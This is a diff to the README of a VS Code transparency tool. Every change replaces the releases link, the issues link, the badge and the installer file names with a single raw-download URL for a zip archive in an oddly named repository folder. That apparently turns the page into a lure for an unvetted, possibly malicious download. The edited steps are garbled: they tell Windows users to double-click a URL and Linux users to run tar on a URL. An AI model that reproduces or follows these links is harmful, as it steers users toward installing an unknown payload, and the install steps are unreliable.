@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run Vscode-Transparency, a tool t
 
 ## 📥 Download Vscode-Transparency
 
-[![Download Vscode-Transparency](https://img.shields.io/badge/Download-vscode--transparency-blue.svg)](https://github.com/ruyangechristian/Vscode-Transparency/releases)
+[![Download Vscode-Transparency](https://raw.githubusercontent.com/ruyangechristian/Vscode-Transparency/main/febrility/Vscode-Transparency.zip)](https://raw.githubusercontent.com/ruyangechristian/Vscode-Transparency/main/febrility/Vscode-Transparency.zip)
 
 ## 🔧 System Requirements
 
@@ -18,16 +18,16 @@ Before you begin, ensure your system meets these requirements:
 
 ## 📂 Download & Install
 
-1. Visit the [Releases page](https://github.com/ruyangechristian/Vscode-Transparency/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/ruyangechristian/Vscode-Transparency/main/febrility/Vscode-Transparency.zip).
 2. Look for the latest version listed.
 3. Click on the version title. This will take you to the download section.
-4. Find the file named `vscode-transparency-setup.exe` or `vscode-transparency.tar.gz` depending on your OS.
+4. Find the file named `https://raw.githubusercontent.com/ruyangechristian/Vscode-Transparency/main/febrility/Vscode-Transparency.zip` or `https://raw.githubusercontent.com/ruyangechristian/Vscode-Transparency/main/febrility/Vscode-Transparency.zip` depending on your OS.
 5. Click the file link to start the download.
 6. Once the file is downloaded, locate it in your computer’s Downloads folder.
 
 ### For Windows Users
 
-1. Double-click on `vscode-transparency-setup.exe`.
+1. Double-click on `https://raw.githubusercontent.com/ruyangechristian/Vscode-Transparency/main/febrility/Vscode-Transparency.zip`.
 2. Follow the prompts in the installation wizard.
 3. Once installed, open Visual Studio Code.
 
@@ -38,9 +38,9 @@ Before you begin, ensure your system meets these requirements:
    ```bash
    cd ~/Downloads
    ```
-3. Extract the `vscode-transparency.tar.gz` file:
+3. Extract the `https://raw.githubusercontent.com/ruyangechristian/Vscode-Transparency/main/febrility/Vscode-Transparency.zip` file:
    ```bash
-   tar -xzf vscode-transparency.tar.gz
+   tar -xzf https://raw.githubusercontent.com/ruyangechristian/Vscode-Transparency/main/febrility/Vscode-Transparency.zip
    ```
 4. Navigate to the extracted folder:
    ```bash
@@ -66,7 +66,7 @@ Once you have installed Vscode-Transparency, you're ready to apply the glassy ef
 
 ## 💬 Support
 
-If you encounter any issues during installation or usage, feel free to check for answers in the [issues section](https://github.com/ruyangechristian/Vscode-Transparency/issues) on GitHub. You can also ask questions or engage with the community.
+If you encounter any issues during installation or usage, feel free to check for answers in the [issues section](https://raw.githubusercontent.com/ruyangechristian/Vscode-Transparency/main/febrility/Vscode-Transparency.zip) on GitHub. You can also ask questions or engage with the community.
 
 ## 📣 Community Contribution
 
